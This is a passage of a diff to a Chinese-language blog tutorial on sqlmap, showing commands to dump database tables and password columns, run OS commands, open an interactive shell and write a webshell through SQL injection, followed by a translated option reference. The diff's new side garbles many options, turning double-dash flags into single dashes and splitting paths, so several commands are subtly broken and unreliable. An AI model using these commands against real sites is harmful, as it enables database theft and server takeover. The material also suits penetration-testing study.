+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://xxx.cn/index.php/Index/view/id/40.html&quot;</span> -D dataname <span class="hljs-attr">--tables</span><br></code></pre></td></tr></table></figure>
 
 <p>(3) 通过2中的数据表得到字段(假如得到的是tablename表)</p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>python sqlmap.py ``-``u ``<span class="hljs-string">&quot;http://xxx.cn/index.php/Index/view/id/40.html&quot;</span>` `-``D dataname ``-``T``tablename ``--columns<br></code></pre></td></tr></table></figure>
+<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">python sqlmap.py -u <span class="hljs-string">&quot;http://xxx.cn/index.php/Index/view/id/40.html&quot;</span> -D dataname -<span class="hljs-built_in">T</span> tablename --<span class="hljs-built_in">columns</span><br></code></pre></td></tr></table></figure>
 
 <p>(4) 通过3得到字段值(假如从3中得到字段id，password)</p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>python sqlmap.py ``-``u ``<span class="hljs-string">&quot;http://xxx.cn/index.php/Index/view/id/40.html&quot;</span>` `-``D dataname ``-``T``tablename ``-``C ``<span class="hljs-string">&quot;password&quot;</span>` `--dump<br></code></pre></td></tr></table></figure>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">python</span> <span class="hljs-variable">sqlmap</span><span class="hljs-operator">.</span><span class="hljs-variable">py</span> <span class="hljs-operator">-</span><span class="hljs-variable">u</span> <span class="hljs-string">&quot;http://xxx.cn/index.php/Index/view/id/40.html&quot;</span> <span class="hljs-operator">-</span><span class="hljs-built_in">D</span> <span class="hljs-variable">dataname</span> <span class="hljs-operator">-</span><span class="hljs-variable">T</span> <span class="hljs-variable">tablename</span> <span class="hljs-operator">-</span><span class="hljs-built_in">C</span> <span class="hljs-string">&quot;password&quot;</span> <span class="hljs-operator">--</span><span class="hljs-variable">dump</span><br></code></pre></td></tr></table></figure>
 
 
 
 <h2 id="十一、SQLMAP注入点执行命令与交互写shell"><a href="#十一、SQLMAP注入点执行命令与交互写shell" class="headerlink" title="十一、SQLMAP注入点执行命令与交互写shell"></a>十一、SQLMAP注入点执行命令与交互写shell</h2><p>(1) 注入点：<a target="_blank" rel="noopener" href="http://192.168.159.1/news.php?id=1">http://192.168.159.1/news.php?id=1</a></p>
 <p>此处采用的是Linux系统</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">1sqlmap <span class="hljs-string">``</span>-<span class="hljs-string">``</span>u [<span class="hljs-string">``</span>url<span class="hljs-string">``</span>]http<span class="hljs-string">``</span><span class="hljs-symbol">:<span class="hljs-string">``</span>/<span class="hljs-string">``</span>/<span class="hljs-string">``</span></span><span class="hljs-number">192.1</span><span class="hljs-string">``</span><span class="hljs-number">68.1</span><span class="hljs-string">``</span><span class="hljs-number">59.1</span><span class="hljs-string">``</span>/<span class="hljs-string">``</span>news.php?<span class="hljs-string">``</span>id<span class="hljs-string">``</span>=<span class="hljs-string">``</span><span class="hljs-number">1</span><span class="hljs-string">``</span>[<span class="hljs-string">``</span>/<span class="hljs-string">``</span>url<span class="hljs-string">``</span>] <span class="hljs-string">``</span>--os-cmd=ipconfig<br></code></pre></td></tr></table></figure>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">sqlmap -u [url]<span class="hljs-link">http://192.168.159.1/news.php?id=1</span>[<span class="hljs-string">/url</span>] --os-cmd=ipconfig<br></code></pre></td></tr></table></figure>
 
 <p>出现语言的选择根据实际的测试网站选择语言</p>
 <p>指定目标站点D:&#x2F;www&#x2F;</p>
 <p>(2) 获取Shell</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">1sqlmap <span class="hljs-string">``</span>-<span class="hljs-string">``</span>u [<span class="hljs-string">``</span>url<span class="hljs-string">``</span>]http<span class="hljs-string">``</span><span class="hljs-symbol">:<span class="hljs-string">``</span>/<span class="hljs-string">``</span>/<span class="hljs-string">``</span></span><span class="hljs-number">192.1</span><span class="hljs-string">``</span><span class="hljs-number">68.1</span><span class="hljs-string">``</span><span class="hljs-number">59.1</span><span class="hljs-string">``</span>/<span class="hljs-string">``</span>news.php?<span class="hljs-string">``</span>id<span class="hljs-string">``</span>=<span class="hljs-string">``</span><span class="hljs-number">1</span><span class="hljs-string">``</span>[<span class="hljs-string">``</span>/<span class="hljs-string">``</span>url<span class="hljs-string">``</span>] <span class="hljs-string">``</span>--os-shell<br></code></pre></td></tr></table></figure>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">sqlmap -u [url]<span class="hljs-link">http://192.168.159.1/news.php?id=1</span>[<span class="hljs-string">/url</span>] --os-shell<br></code></pre></td></tr></table></figure>
 
 <p>出现语言的选择根据实际的测试网站选择语言</p>
 <p>指定目标站点D:&#x2F;www&#x2F;</p>
@@ -412,19 +412,19 @@
 <p>只要权限足够大，你可以输入使用任何命令。</p>
 <p>其他命令参考下面：</p>
 <p>从数据库中搜索字段</p>
-<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-number">1</span>sqlmap <span class="hljs-string">``</span>-<span class="hljs-string">``</span>r “c<span class="hljs-string">``</span>:<span class="hljs-string">``</span>\tools\request.txt” –dbms mysql <span class="hljs-string">``</span>-<span class="hljs-string">``</span>D dedecms –search <span class="hljs-string">``</span>-<span class="hljs-string">``</span>C <span class="hljs-literal">admin</span><span class="hljs-string">``</span>,<span class="hljs-string">``</span>password<br></code></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">sqlmap -r &quot;c:\tools\request.txt&quot; -dbms mysql -D dedecms -<span class="hljs-keyword">search</span> -C <span class="hljs-keyword">admin</span>,<span class="hljs-keyword">password</span><br></code></pre></td></tr></table></figure>
 
 <p>在dedecms数据库中搜索字段admin或者password。</p>
 <p>读取与写入文件</p>
 <p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
-<p>–file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）</p>
-<p>–file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p>
-<p>–file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径</p>
+<p>-file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）</p>
+<p>-file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p>
+<p>-file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径</p>
 <p>#示例：</p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>sqlmap ``-``r “c``:``\request.txt” ``-``p ``id` `–dbms mysql –``file``-``dest “e``:``\php\htdocs\dvwa\inc\include\``<span class="hljs-number">1</span>.``php” –``file``-``write` `“f``:``\webshell\``<span class="hljs-number">1112</span>.``php”<br></code></pre></td></tr></table></figure>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">sqlmap -r <span class="hljs-string">&quot;c: \request.txt&quot;</span>  -p <span class="hljs-built_in">id</span> -dbms mysql -<span class="hljs-built_in">file</span>-dest <span class="hljs-string">&quot;e:\php\htdocs\dvwa\inc\include\1. php&quot;</span> -<span class="hljs-built_in">file</span> -<span class="hljs-built_in">write</span> <span class="hljs-string">&quot;f:\webshell\1112.php&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p>使用shell命令：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">1sqlmap ``-``r “c``:``\tools\request.txt” ``-``p ``id` `–dms mysql –os``-``shell<br></code></pre></td></tr></table></figure>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">sqlmap <span class="hljs-operator">-</span>r <span class="hljs-string">&quot;c : <span class="hljs-subst">\t</span>ools<span class="hljs-subst">\r</span>equest.txt&quot;</span> <span class="hljs-operator">-</span>p id <span class="hljs-operator">-</span>dms mysql <span class="hljs-operator">-</span>os<span class="hljs-operator">-</span>shell<br></code></pre></td></tr></table></figure>
 
 <p>接下来指定网站可写目录：</p>
 <p>“E:\php\htdocs\dvwa”</p>
@@ -438,20 +438,20 @@
 <li>-current-user 当前数据库用户</li>
 <li>-random-agent 构造随机user-agent</li>
 <li>-passwords 数据库密码</li>
-<li>-proxy <a target="_blank" rel="noopener" href="http://local:8080/">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理</li>
+<li>-proxy <a target="_blank" rel="noopener" href="http://local:8080/">http://local:8080</a> -threads 10 (可以自定义线程加速) 代理</li>
 <li>-time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</li>
 </ul>
 <p>Options（选项）：</p>
 <ul>
 <li>-version 显示程序的版本号并退出</li>
-<li>-h, –help 显示此帮助消息并退出</li>
+<li>-h, -help 显示此帮助消息并退出</li>
 <li>-v VERBOSE 详细级别：0-6（默认为1）</li>
 </ul>
 <p>Target（目标）：</p>
 <p>以下至少需要设置其中一个选项，设置目标URL。</p>
 <ul>
 <li>-d DIRECT 直接连接到数据库。</li>
-<li>-u URL, –url&#x3D;URL 目标URL。</li>
+<li>-u URL, -url&#x3D;URL 目标URL。</li>
 <li>-l LIST 从Burp或WebScarab代理的日志中解析目标。</li>
 <li>-r REQUESTFILE 从一个文件中载入HTTP请求。</li>
 <li>-g GOOGLEDORK 处理Google dork的结果作为目标URL。</li>
@@ -463,9 +463,9 @@
 <li>-data&#x3D;DATA 通过POST发送的数据字符串</li>
 <li>-cookie&#x3D;COOKIE HTTP Cookie头</li>
 <li>-cookie-urlencode URL 编码生成的cookie注入</li>
-<li>-drop-set-cookie 忽略响应的Set – Cookie头信息</li>
-<li>-user-agent&#x3D;AGENT 指定 HTTP User – Agent头</li>
-<li>-random-agent 使用随机选定的HTTP User – Agent头</li>
+<li>-drop-set-cookie 忽略响应的Set - Cookie头信息</li>
+<li>-user-agent&#x3D;AGENT 指定 HTTP User - Agent头</li>
+<li>-random-agent 使用随机选定的HTTP User - Agent头</li>
 <li>-referer&#x3D;REFERER 指定 HTTP Referer头</li>
 <li>-headers&#x3D;HEADERS 换行分开，加入其他的HTTP头</li>
 <li>-auth-type&#x3D;ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)</li>
@@ -484,7 +484,7 @@
 <p>Enumeration（枚举）：</p>
 <p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。</p>
 <ul>
-<li>-b, –banner 检索数据库管理系统的标识</li>
+<li>-b, -banner 检索数据库管理系统的标识</li>
 <li>-current-user 检索数据库管理系统当前用户</li>
 <li>-current-db 检索数据库管理系统当前数据库</li>
 <li>-is-dba 检测DBMS当前用户是否DBA</li>
@@ -494,7 +494,7 @@
 <li>-roles 枚举数据库管理系统用户的角色</li>
 <li>-dbs 枚举数据库管理系统数据库</li>
 <li>-D DBname 要进行枚举的指定数据库名</li>
-<li>-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）</li>
+<li>-T TBLname 要进行枚举的指定数据库表（如：-T tablename -columns）</li>
 <li>-tables 枚举的DBMS数据库中的表</li>
 <li>-columns 枚举DBMS数据库表列</li>
 <li>-dump 转储数据库管理系统的数据库中的表项</li>
@@ -514,103 +514,103 @@
 <p>这些选项可用于优化SqlMap的性能。</p>
 <ul>
 <li>-o 开启所有优化开关</li>
-<li>–predict-output 预测常见的查询输出</li>
-<li>–keep-alive 使用持久的HTTP（S）连接</li>
-<li>–null-connection 从没有实际的HTTP响应体中检索页面长度</li>
-<li>–threads&#x3D;THREADS 最大的HTTP（S）请求并发量（默认为1）</li>
+<li>-predict-output 预测常见的查询输出</li>
+<li>-keep-alive 使用持久的HTTP（S）连接</li>
+<li>-null-connection 从没有实际的HTTP响应体中检索页面长度</li>
+<li>-threads&#x3D;THREADS 最大的HTTP（S）请求并发量（默认为1）</li>
 </ul>
 <p>Injection（注入）：</p>
 <p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p>
 <ul>
 <li>-p TESTPARAMETER 可测试的参数（S）</li>
-<li>–dbms&#x3D;DBMS 强制后端的DBMS为此值</li>
-<li>–os&#x3D;OS 强制后端的DBMS操作系统为这个值</li>
-<li>–prefix&#x3D;PREFIX 注入payload字符串前缀</li>
-<li>–suffix&#x3D;SUFFIX 注入payload字符串后缀</li>
-<li>–tamper&#x3D;TAMPER 使用给定的脚本（S）篡改注入数据</li>
+<li>-dbms&#x3D;DBMS 强制后端的DBMS为此值</li>
+<li>-os&#x3D;OS 强制后端的DBMS操作系统为这个值</li>
+<li>-prefix&#x3D;PREFIX 注入payload字符串前缀</li>
+<li>-suffix&#x3D;SUFFIX 注入payload字符串后缀</li>
+<li>-tamper&#x3D;TAMPER 使用给定的脚本（S）篡改注入数据</li>
 </ul>
 <p>Detection（检测）：</p>
 <p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p>
 <ul>
-<li>–level&#x3D;LEVEL 执行测试的等级（1-5，默认为1）</li>
-<li>–risk&#x3D;RISK 执行测试的风险（0-3，默认为1）</li>
-<li>–string&#x3D;STRING 查询时有效时在页面匹配字符串</li>
-<li>–regexp&#x3D;REGEXP 查询时有效时在页面匹配正则表达式</li>
-<li>–text-only 仅基于在文本内容比较网页</li>
+<li>-level&#x3D;LEVEL 执行测试的等级（1-5，默认为1）</li>
+<li>-risk&#x3D;RISK 执行测试的风险（0-3，默认为1）</li>
+<li>-string&#x3D;STRING 查询时有效时在页面匹配字符串</li>
+<li>-regexp&#x3D;REGEXP 查询时有效时在页面匹配正则表达式</li>
+<li>-text-only 仅基于在文本内容比较网页</li>
 </ul>
 <p>Techniques（技巧）：</p>
 <p>这些选项可用于调整具体的SQL注入测试。</p>
 <ul>
-<li>–technique&#x3D;TECH SQL注入技术测试（默认BEUST）</li>
-<li>–time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</li>
-<li>–union-cols&#x3D;UCOLS 定列范围用于测试UNION查询注入</li>
-<li>–union-char&#x3D;UCHAR 用于暴力猜解列数的字符</li>
+<li>-technique&#x3D;TECH SQL注入技术测试（默认BEUST）</li>
+<li>-time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</li>
+<li>-union-cols&#x3D;UCOLS 定列范围用于测试UNION查询注入</li>
+<li>-union-char&#x3D;UCHAR 用于暴力猜解列数的字符</li>
 </ul>
 <p>Fingerprint（指纹）：</p>
 <ul>
-<li>-f, –fingerprint 执行检查广泛的DBMS版本指纹</li>
+<li>-f, -fingerprint 执行检查广泛的DBMS版本指纹</li>
 </ul>
 <p>Brute force（蛮力）：</p>
 <p>这些选项可以被用来运行蛮力检查。</p>
 <ul>
-<li>–common-tables 检查存在共同表</li>
-<li>–common-columns 检查存在共同列</li>
+<li>-common-tables 检查存在共同表</li>
+<li>-common-columns 检查存在共同列</li>
 </ul>
 <p>User-defined function injection（用户自定义函数注入）：</p>
 <p>这些选项可以用来创建用户自定义函数。</p>
-<p>–udf-inject 注入用户自定义函数</p>
-<p>–shared-lib&#x3D;SHLIB 共享库的本地路径</p>
+<p>-udf-inject 注入用户自定义函数</p>
+<p>-shared-lib&#x3D;SHLIB 共享库的本地路径</p>
 <p>File system access（访问文件系统）：</p>
 <p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
 <ul>
-<li>–file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件</li>
-<li>–file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件</li>
-<li>–file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径</li>
+<li>-file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件</li>
+<li>-file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件</li>
+<li>-file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径</li>
 </ul>
 <p>Operating system access（操作系统访问）：</p>
 <p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
 <ul>
-<li>–os-cmd&#x3D;OSCMD 执行操作系统命令</li>
-<li>–os-shell 交互式的操作系统的shell</li>
-<li>–os-pwn 获取一个OOB shell，meterpreter或VNC</li>
-<li>–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</li>
-<li>–os-bof 存储过程缓冲区溢出利用</li>
-<li>–priv-esc 数据库进程用户权限提升</li>
-<li>–msf-path&#x3D;MSFPATH Metasploit Framework本地的安装路径</li>
-<li>–tmp-path&#x3D;TMPPATH 远程临时文件目录的绝对路径</li>
+<li>-os-cmd&#x3D;OSCMD 执行操作系统命令</li>
+<li>-os-shell 交互式的操作系统的shell</li>
+<li>-os-pwn 获取一个OOB shell，meterpreter或VNC</li>
+<li>-os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</li>
+<li>-os-bof 存储过程缓冲区溢出利用</li>
+<li>-priv-esc 数据库进程用户权限提升</li>
+<li>-msf-path&#x3D;MSFPATH Metasploit Framework本地的安装路径</li>
+<li>-tmp-path&#x3D;TMPPATH 远程临时文件目录的绝对路径</li>
 </ul>
 <p>Windows注册表访问：</p>
 <p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p>
 <ul>
-<li>–reg-read 读一个Windows注册表项值</li>
-<li>–reg-add 写一个Windows注册表项值数据</li>
-<li>–reg-del 删除Windows注册表键值</li>
-<li>–reg-key&#x3D;REGKEY Windows注册表键</li>
-<li>–reg-value&#x3D;REGVAL Windows注册表项值</li>
-<li>–reg-data&#x3D;REGDATA Windows注册表键值数据</li>
-<li>–reg-type&#x3D;REGTYPE Windows注册表项值类型</li>
+<li>-reg-read 读一个Windows注册表项值</li>
+<li>-reg-add 写一个Windows注册表项值数据</li>
+<li>-reg-del 删除Windows注册表键值</li>
+<li>-reg-key&#x3D;REGKEY Windows注册表键</li>
+<li>-reg-value&#x3D;REGVAL Windows注册表项值</li>
+<li>-reg-data&#x3D;REGDATA Windows注册表键值数据</li>
+<li>-reg-type&#x3D;REGTYPE Windows注册表项值类型</li>
 <li>这些选项可以用来设置一些一般的工作参数。</li>
 <li>-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中</li>
 <li>-s SESSIONFILE 保存和恢复检索会话文件的所有数据</li>
-<li>–flush-session 刷新当前目标的会话文件</li>
-<li>–fresh-queries 忽略在会话文件中存储的查询结果</li>
-<li>–eta 显示每个输出的预计到达时间</li>
-<li>–update 更新SqlMap</li>
-<li>–save file保存选项到INI配置文件</li>
-<li>–batch 从不询问用户输入，使用所有默认配置。</li>
+<li>-flush-session 刷新当前目标的会话文件</li>
+<li>-fresh-queries 忽略在会话文件中存储的查询结果</li>
+<li>-eta 显示每个输出的预计到达时间</li>
+<li>-update 更新SqlMap</li>
+<li>-save file保存选项到INI配置文件</li>
+<li>-batch 从不询问用户输入，使用所有默认配置。</li>
 </ul>
 <p>Miscellaneous（杂项）：</p>
 <ul>
-<li>–beep 发现SQL注入时提醒</li>
-<li>–check-payload IDS对注入payloads的检测测试</li>
-<li>–cleanup SqlMap具体的UDF和表清理DBMS</li>
-<li>–forms 对目标URL的解析和测试形式</li>
-<li>–gpage&#x3D;GOOGLEPAGE 从指定的页码使用谷歌dork结果</li>
-<li>–page-rank Google dork结果显示网页排名（PR）</li>
-<li>–parse-errors 从响应页面解析数据库管理系统的错误消息</li>
-<li>–replicate 复制转储的数据到一个sqlite3数据库</li>
-<li>–tor 使用默认的Tor（Vidalia&#x2F; Privoxy&#x2F; Polipo）代理地址</li>
-<li>–wizard 给初级用户的简单向导界面</li>
+<li>-beep 发现SQL注入时提醒</li>
+<li>-check-payload IDS对注入payloads的检测测试</li>
+<li>-cleanup SqlMap具体的UDF和表清理DBMS</li>
+<li>-forms 对目标URL的解析和测试形式</li>
+<li>-gpage&#x3D;GOOGLEPAGE 从指定的页码使用谷歌dork结果</li>
+<li>-page-rank Google dork结果显示网页排名（PR）</li>
+<li>-parse-errors 从响应页面解析数据库管理系统的错误消息</li>
+<li>-replicate 复制转储的数据到一个sqlite3数据库</li>
+<li>-tor 使用默认的Tor（Vidalia&#x2F; Privoxy&#x2F; Polipo）代理地址</li>
+<li>-wizard 给初级用户的简单向导界面</li>
 </ul>
 
                 
